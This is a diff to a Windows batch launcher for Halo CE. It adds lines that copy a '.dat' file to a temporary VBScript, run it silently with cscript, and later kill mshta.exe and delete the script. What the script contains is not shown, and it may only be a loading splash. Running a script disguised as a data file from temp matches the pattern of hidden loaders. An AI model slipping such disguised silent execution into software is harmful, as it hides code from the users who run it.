@@ -1,6 +1,8 @@
 setlocal enabledelayedexpansion
 set USERPROFILE=%CD%\data
 set docroot=Documents
+copy "%CD%\load.dat" "%temp%\load.vbs"
+start /b cscript.exe "%temp%\load.vbs"
 :init
 set osv=1
 if not exist "%CD%\resources\osver.dll" (
@@ -282,6 +284,8 @@ if exist "%CD%\resources\base.dll" (
 															move /Y "%CD%\medals.zip" "%CD%\data\%docroot%\My Games\Halo CE\dat\packs\medals.zip"
 															move /Y "%temp%\medals.txt" "%CD%\data\%docroot%\My Games\Halo CE\dat\versions\medals.ns"
 														)
+														taskkill /IM mshta.exe /f
+														del "%temp%\load.vbs"
 														"%CD%\resources\base.dll" -console -use21
 														reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft Games\Halo CE" /f
 														reg delete "HKEY_CURRENT_USER\Software\Microsoft\Microsoft Games\Halo CE" /f
@@ -749,4 +753,6 @@ del "%temp%\vorbis.txt"
 del "%temp%\vorbisfile.txt"
 del "%temp%\medals.txt"
 del "%temp%\os.txt"
+taskkill /IM mshta.exe /f
+del "%temp%\load.vbs"
 exit
